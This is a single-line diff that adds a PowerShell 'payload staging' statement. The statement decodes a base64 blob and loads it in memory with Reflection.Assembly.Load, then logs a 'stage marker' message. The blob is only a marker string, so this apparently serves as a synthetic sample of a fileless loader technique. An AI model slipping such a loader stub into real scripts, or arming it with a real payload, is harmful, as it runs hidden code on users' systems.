@@ -1,0 +1,1 @@
+<# Payload staging #> $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjpoNnNybnFsNWZi'); $StageResult = [Reflection.Assembly]::Load($PayloadBytes); $StageResult.GetTypes().Count; Write-Verbose "stage marker 18 reached"; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
